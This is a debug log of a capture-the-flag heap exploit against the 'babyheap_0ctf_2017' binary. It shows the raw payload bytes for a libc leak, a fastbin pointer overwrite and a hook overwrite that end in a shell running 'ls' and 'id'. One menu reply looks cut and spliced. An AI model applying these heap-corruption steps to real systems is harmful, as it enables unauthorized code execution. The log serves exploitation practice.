[DEBUG] Sent 0x20 bytes:
    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000010  00 00 00 00  00 00 00 00  91 00 00 00  00 00 00 00  │····│····│····│····│
    00000020
[DEBUG] Received 0x35 bytes:
    '1. Allocate\n'
    '2. Fill\n'
    '3. Free\n'
    '4. Dump\n'
    '5. Exit\n'
    'Command: '
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x6 bytes:
    'Size: '
[DEBUG] Sent 0x4 bytes:
    '128\n'
[DEBUG] Received 0x46 bytes:
    'Allocate Index 5\n'
    '1. Allocate\n'
    '2. Fill\n'
    '3. Free\n'
    '4. Dump\n'
    '5. Exit\n'
    'Command: '
[DEBUG] Sent 0x2 bytes:
    '3\n'
[DEBUG] Received 0x7 bytes:
    'Index: '
[DEBUG] Sent 0x2 bytes:
    '4\n'
[DEBUG] Received 0x35 bytes:
    '1. Allocate\n'
    '2. Fill\n'
    '3. Free\n'
    '4. Dump\n'
    '5. Exit\n'
    'Command: '
[DEBUG] Sent 0x2 bytes:
    '4\n'
[DEBUG] Received 0x7 bytes:
    'Index: '
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x50 bytes:
    00000000  43 6f 6e 74  65 6e 74 3a  20 0a 78 1b  dd f7 ff 7f  │Cont│ent:│ ·x·│····│
    00000010  00 00 78 1b  dd f7 ff 7f  00 00 0a 31  2e 20 41 6c  │··x·│····│···1│. Al│
    00000020  6c 6f 63 61  74 65 0a 32  2e 20 46 69  6c 6c 0a 33  │loca│te·2│. Fi│ll·3│
    00000030  2e 20 46 72  65 65 0a 34  2e 20 44 75  6d 70 0a 35  │. Fr│ee·4│. Du│mp·5│
    00000040  2e 20 45 78  69 74 0a 43  6f 6d 6d 61  6e 64 3a 20  │. Ex│it·C│omma│nd: │
    00000050
[*] libc_base: 0x7ffff7a0d000
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x6 bytes:
    'Size: '
[DEBUG] Sent 0x3 bytes:
    '96\n'
[DEBUG] Received 0x46 bytes:
    'Allocate Index 4\n'
    '1. Allocate\n'
    '2. Fill\n'
    '3. Free\n'
    '4. Dump\n'
    '5. Exit\n'
    'Command: '
[DEBUG] Sent 0x2 bytes:
    '3\n'
[DEBUG] Received 0x7 bytes:
    'Index: '
[DEBUG] Sent 0x2 bytes:
    '4\n'
[DEBUG] Received 0x35 bytes:
    '1. Allocate\n'
    '2. Fill\n'
    '3. Free\n'
    '4. Dump\n'
    '5. Exit\n'
    'Command: '
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x7 bytes:
    'Index: '
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x6 bytes:
    'Size: '
[DEBUG] Sent 0x2 bytes:
    '8\n'
[DEBUG] Received 0x9 bytes:
    'Content: '
[DEBUG] Sent 0x8 bytes:
    00000000  ed 1a dd f7  ff 7f 00 00                            │····│····│
    00000008
[DEBUG] Received 0x35 bytes:
    '1. Allocate\n'
    '2. Fill\n'
    '3. Free\n'
    '4. Dump\n'
    '5. Exit\n'
    'Command: '
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x6 bytes:
    'Size: '
[DEBUG] Sent 0x3 bytes:
    '96\n'
[DEBUG] Received 0x46 bytes:
    'Allocate Index 4\n'
    '1. Allocate\n'
    '2. Fill\n'
    '3. Free\n'
    '4. Dump\n'
    '5. Exit\n'
    'Command: '
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x6 bytes:
    'Size: '
[DEBUG] Sent 0x3 bytes:
    '96\n'
[DEBUG] Received 0x46 bytes:
    'Allocate Index 6\n'
    '1. Allocate\n'
    '2. Fill\n'
    '2\n'
[DEBUG] Received 0x7 bytes:
    'Index: '
[DEBUG] Sent 0x2 bytes:
    '6\n'
[DEBUG] Received 0x6 bytes:
    'Size: '
[DEBUG] Sent 0x3 bytes:
    '27\n'
[DEBUG] Received 0x9 bytes:
    'Content: '
[DEBUG] Sent 0x1b bytes:
    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000010  00 00 00 7a  22 a5 f7 ff  7f 00 00                  │···z│"···│···│
    0000001b
[DEBUG] Received 0x35 bytes:
    '1. Allocate\n'
    '2. Fill\n'
    '3. Free\n'
    '4. Dump\n'
    '5. Exit\n'
    'Command: '
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x6 bytes:
    'Size: '
[DEBUG] Sent 0x4 bytes:
    '255\n'
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0xb1 bytes:
    'babyheap_0ctf_2017\t  docker_hacknote    hadoop-3.3.0.tar.gz  yichen_exp.py\n'
    'babyheap_0ctf_2017_patch  docker_one_gadget  main_arena_offset\n'
    'docker_babyrop\t\t  edb\t\t     pwndbg-dev\n'
babyheap_0ctf_2017      docker_hacknote    hadoop-3.3.0.tar.gz  yichen_exp.py
babyheap_0ctf_2017_patch  docker_one_gadget  main_arena_offset
docker_babyrop          edb             pwndbg-dev
$ id
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x81 bytes:
    'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)\n'
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$  
```

